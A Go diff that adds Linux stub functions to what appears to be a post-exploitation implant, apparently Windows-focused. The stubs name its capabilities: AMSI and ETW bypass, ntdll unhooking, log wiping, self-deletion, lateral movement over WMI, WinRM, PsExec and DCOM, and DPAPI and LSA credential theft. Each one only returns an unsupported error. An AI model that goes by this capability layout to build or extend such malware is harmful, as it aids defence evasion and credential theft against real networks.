@@ -278,13 +278,108 @@ func executeNetCommand(cmd string) string {
 func amsiBypass() string {
 	return "not supported on Linux"
 }
+func amsiSessionBypass() string {
+	return "not supported on Linux"
+}
 
 func etwBypass() string {
+	return "not supported on Linux"
+}
+func etwNtTraceEvent() string {
+	return "not supported on Linux"
+}
+
+func blockDLLs() string {
+	return "not supported on Linux"
+}
+
+func unhookNtdll() string {
+	return "not supported on Linux"
+}
+
+func protectProcess() string {
+	return "not supported on Linux"
+}
+
+func selfDelete() string {
+	return "not supported on Linux"
+}
+
+func wipeEventLog() string {
+	return "not supported on Linux"
+}
+
+func wipeTracks() string {
 	return "not supported on Linux"
 }
 
 func selfUpdateWindows(exe, tmpPath string) string {
 	return ""
+}
+
+func lateralWMI(target, user, pass, cmd string) (string, error) {
+	return "", fmt.Errorf("lateral movement is Windows-only")
+}
+func lateralWinRM(target, user, pass, cmd string) (string, error) {
+	return "", fmt.Errorf("lateral movement is Windows-only")
+}
+func lateralPsexec(target, user, pass, cmd string) (string, error) {
+	return "", fmt.Errorf("lateral movement is Windows-only")
+}
+func lateralDCOM(target, user, pass, cmd string) (string, error) {
+	return "", fmt.Errorf("lateral movement is Windows-only")
+}
+func lateralSCF(targetShare string) (string, error) {
+	return "", fmt.Errorf("SCF hash capture is Windows-only")
+}
+func netScanSMB(cidr string) (string, error) {
+	return "", fmt.Errorf("SMB scanning is Windows-only")
+}
+func netEnumHosts(domain string) (string, error) {
+	return "", fmt.Errorf("host enumeration is Windows-only")
+}
+func netScanSMBDiscovery() (string, error) {
+	return "", fmt.Errorf("SMB discovery is Windows-only")
+}
+
+func dpapiMasterKey() (string, error) {
+	return "", fmt.Errorf("DPAPI is Windows-only")
+}
+func dpapiBlob(filePath string) (string, error) {
+	return "", fmt.Errorf("DPAPI is Windows-only")
+}
+func dpapiBrowser() (string, error) {
+	return "", fmt.Errorf("DPAPI browser decryption is Windows-only")
+}
+func lsaBypass() (string, error) {
+	return "", fmt.Errorf("LSA bypass is Windows-only")
+}
+func adcsFind() (string, error) {
+	return "", fmt.Errorf("AD CS enumeration is Windows-only")
+}
+func adcsRequest(template string) (string, error) {
+	return "", fmt.Errorf("AD CS certificate request is Windows-only")
+}
+func shadowCreds(target string) (string, error) {
+	return "", fmt.Errorf("Shadow Credentials is Windows-only")
+}
+func ldapQuery(filter string) (string, error) {
+	return "", fmt.Errorf("LDAP queries are Windows-only")
+}
+func ldapUsers() (string, error) {
+	return "", fmt.Errorf("LDAP queries are Windows-only")
+}
+func ldapGroups() (string, error) {
+	return "", fmt.Errorf("LDAP queries are Windows-only")
+}
+func ldapComputers() (string, error) {
+	return "", fmt.Errorf("LDAP queries are Windows-only")
+}
+func ldapSPN() (string, error) {
+	return "", fmt.Errorf("LDAP queries are Windows-only")
+}
+func ldapACL() (string, error) {
+	return "", fmt.Errorf("LDAP queries are Windows-only")
 }
 
 func selfUpdateLinux(exe, tmpPath string) string {
